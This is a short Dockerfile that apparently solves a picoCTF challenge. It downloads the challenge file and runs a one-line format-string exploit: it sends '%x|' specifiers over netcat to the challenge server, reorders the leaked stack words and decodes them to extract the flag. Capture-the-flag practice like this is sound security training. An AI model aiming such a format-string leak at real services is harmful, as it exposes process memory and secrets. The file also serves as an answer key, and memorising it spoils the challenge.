# 105

FROM ubuntu

RUN apt-get update && apt-get install -y wget netcat xxd

WORKDIR /picoctf

RUN wget https://mercury.picoctf.net/static/77a2b202236aa741e988581e78d277a6/enc

CMD set -x; printf "1\n%100s\n" | sed 's/ /%x|/g' | nc mercury.picoctf.net 27912 | sed -E "s/(\w{2})(\w{2})(\w{2})(\w+)\|/\4\3\2\1/gi" | xxd -r -p | grep -aoP 'picoCTF{.+}'
